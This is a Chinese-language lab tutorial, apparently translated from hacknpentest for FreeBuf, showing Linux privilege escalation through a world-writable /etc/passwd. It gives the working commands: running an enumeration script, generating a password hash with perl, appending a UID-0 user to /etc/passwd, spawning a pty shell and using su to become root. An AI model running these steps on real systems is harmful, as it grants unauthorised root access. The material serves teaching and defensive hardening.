![](https://image.3001.net/images/20190806/1565046812_5d48b81c36b95.jpg!small)

**在红队评估期间，队员们往往会面临许多不同的场景，最为常见的场景比如只有一个普通或低级别的shell。在Windows环境中，管理员或管理员组的成员会具有较高的权限，而这些高权限用户也是攻击者的主要目标。同样，在Linux环境中root或具有sudo权限的用户也将会是攻击者的主要针对用户。**

本文我们将讨论有关文件配置错误导致权限提升的例子。通常，在CTF挑战期间，我们总会想到查看passwd文件，以了解系统上可用的用户。

passwd文件存在于Linux root的/etc目录中。最重要的一点是，该文件非特权用户也可以进行访问。

## /etc/passwd

Linux系统中的每个用户都在/etc/passwd文件中有一个对应的记录行，它记录了这个用户的一些基本属性。这个文件对所有用户都是可读的。它是一个以冒号分隔的文件，按顺序其包含的信息如下：

> 用户名
>
> 加密密码
>
> 用户 ID (或 UID)
>
> 组 ID (或 GUID)
>
> 用户全名
>
> 用户家目录
>
> 登录 Shell

现在，我们将查看/etc/passwd文件：

![2.JPG](https://image.3001.net/images/20190806/1565046836_5d48b83402099.jpg!small)

让我们详细了解一下“/etc/passwd”文件，这里我们以root用户为例：

> root：用户名。
>
> x：放置用户密码。密码直接从“/etc/shadow”文件中获取。
>
> 0：root用户UID。
>
> 0：root用户GID。
>
> root：用户描述的占位符。
>
> /root：用户的家目录。将在终端会话中向用户显示该目录。
>
> /bin/bash：用户的shell。根据用户的目的，将在用户登录时生成此shell。

## 环境设置

在VM中两个Linux系统的配置如下，并使用NAT网络模式（用于共享主机的IP地址）。

OS Name | Role | OS Version | Machine IP | Kernel Version  
---|---|---|---|---  
Kali Linux (x64 bit) | 攻击者机器 | Kali | 192.168.245.134 | 4.12.0-kali2-686  
Ubuntu (x64 bit) | 易受攻击机器 | Ubuntu 14.04.6 LTS | 192.168.245.146 |
4.4.0-142-generic  
  
我们假设已在攻击者机器（kali）上获取到了目标系统的hacknpentest用户权限。现在，我们将上传[linuxprivchecker.py](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)
python脚本来查看，目标系统上可能存在的错误配置。

我们使用wget（或web get）将文件下载到目标服务器。

![3.JPG](https://image.3001.net/images/20190806/1565046854_5d48b8464222d.jpg!small)

默认情况下，Python已在所有linux机器上安装。我们将使用以下命令来运行枚举脚本。

    
    
    python linuxprivchecker.py

![4.JPG](https://image.3001.net/images/20190806/1565046867_5d48b853e7a12.jpg!small)

仔细查看脚本输出，我们发现passwd文件是world可写文件，具有对普通用户的读，写和修改权限。

![5.JPG](https://image.3001.net/images/20190806/1565046886_5d48b8667e3cd.jpg!small)

权限的错误配置可能会被以某种方式滥用，从而将当前用户权限提升为root用户。现在，我们将尝试写入passwd文件以使我们成为root用户。

我们将向passwd文件添加一个用户，并在相应的字段中显式地给出加密密码。你可以使用perl语言生成带有salt的加密密码，如下所示：

    
    
    $perl -le 'print crypt("THIS_IS_Original_PASSWORD","SALT")'
    

下面的命令将向passwd文件添加一个具有加密密码和UID，GID设置为root [ **0** ]的用户。

    
    
    echo "Tom:Encrypted_Password:0:0:User_like_root:/root:/bin/bash" &ampgt&ampgt /etc/passwd

让我们拆解下我们要添加到passwd文件的字段。

> Tom：用户名
>
> ad7t5uIalqMws：加密用户密码
>
> 0：root用户ID
>
> 0：root组ID
>
> User_like_root：用户描述
>
> /root：用户家目录
>
> /bin/bash：用户的Shell

'>>'符号将输出重定向到文件，并在结尾附加重定向输出的内容（此处为/etc/passwd文件）。

生成加密密码：

    
    
    perl -le ‘print crypt(“Password@973″,”addedsalt”)’

![6.JPG](https://image.3001.net/images/20190806/1565046908_5d48b87c74026.jpg!small)

上面的命令将生成一个带有以下密码和salt的哈希：

> 原密码：Password@973
>
> 盐：addedsalt
>
> 加密密码：ad7t5uIalqMws

使用上面的加密密码，我们现在将以下内容附加到/etc/passwd文件中。

    
    
    echo "Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash" &ampgt&ampgt /etc/passwd

![7.JPG](https://image.3001.net/images/20190806/1565046924_5d48b88c9d305.jpg!small)

Tom用户已成功被附加到/etc/passwd文件。

    
    
    cat /etc/passwd

![8.JPG](https://image.3001.net/images/20190806/1565046936_5d48b8988e30e.jpg!small)

现在，使用su命令我们将尝试使用Tom用户登录。

![9.JPG](https://image.3001.net/images/20190806/1565046948_5d48b8a45c4c0.jpg!small)

这里提示必须在终端运行，但我们并没有什么合适的终端。我们将使用以下python one liner（目标服务器上已安装了python）迁移到bash
shell：

    
    
    python -c 'import pty; pty.spawn("/bin/bash")'

![10.JPG](https://image.3001.net/images/20190806/1565046961_5d48b8b1ca684.jpg!small)

现在，我们尝试使用以下命令登录Tom用户：

    
    
    su – Tom

太棒了！可以看到现在我们的用户权限已提升为了root！

![11.JPG](https://image.3001.net/images/20190806/1565046975_5d48b8bf20632.jpg!small)

## 总结

我们在passwd文件中发现了权限配置错误，并最终利用这一点将我们的用户权限提升为了root。在下一篇文章中，我们将讨论有关Linux权限提升的其他方法。

 ***参考来源：[hacknpentest](https://hacknpentest.com/linux-privilege-escalation-via-writeable-etc-passwd-file/)，FB小编secist编译，转载请注明来自FreeBuf.COM**

